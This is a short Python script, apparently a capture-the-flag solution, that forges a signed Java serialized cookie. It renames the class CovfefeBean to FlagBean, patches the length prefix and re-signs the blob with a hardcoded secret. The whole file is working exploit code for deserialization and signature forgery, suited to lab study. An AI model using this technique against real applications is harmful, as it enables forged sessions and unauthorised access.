import base64
import hashlib

sign = "c@ram31m4cchi@o"

# CovfefeBean signed value from breed.jsp
covfefe = "rO0ABXNyABJjb2ZmZWUuQ292ZmVmZUJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAHQ292ZmVmZXBw-7ed88df1a47853cf4f9b8b404a10ae50320765a8918ba2fa9960bb17585466f9"

b64 = covfefe.split("-")[0]
raw = base64.b64decode(b64)

# Replace class name coffee.CovfefeBean (18 chars) with coffee.FlagBean (15 chars)
old = b"coffee.CovfefeBean"
new = b"coffee.FlagBean"
assert old in raw
raw2 = raw.replace(old, new)

# Fix the 2-byte length prefix before the class name
# The length prefix is 2 bytes before the class name
idx = raw2.find(new)
# length prefix is at idx-2
old_len = len(old)
new_len = len(new)
raw2 = raw2[:idx-2] + new_len.to_bytes(2, 'big') + raw2[idx:]

b64_new = base64.b64encode(raw2).decode()
sig = hashlib.sha256((b64_new + sign).encode()).hexdigest()
result = b64_new + "-" + sig
print(result)
end_of_edit

